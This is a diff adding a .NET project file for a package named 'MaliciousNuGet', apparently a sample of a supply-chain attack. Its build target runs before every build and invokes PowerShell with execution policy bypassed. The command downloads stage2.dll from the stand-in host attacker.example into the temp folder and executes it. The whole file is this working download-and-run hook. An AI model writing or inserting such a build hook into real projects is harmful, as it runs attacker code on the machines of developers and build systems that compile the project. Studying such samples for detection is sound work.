@@ -1,0 +1,13 @@
+<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <TargetFramework>net8.0</TargetFramework>
+    <PackageId>MaliciousNuGet</PackageId>
+    <Version>1.0.0</Version>
+  </PropertyGroup>
+
+  <Target Name="ExecutePayload" BeforeTargets="Build">
+    <Exec Command="powershell.exe -NoProfile -ExecutionPolicy Bypass -Command &quot;Invoke-WebRequest https://attacker.example/stage2.dll -OutFile $(TEMP)\stage2.dll; Start-Process $(TEMP)\stage2.dll&quot;" />
+  </Target>
+
+</Project>
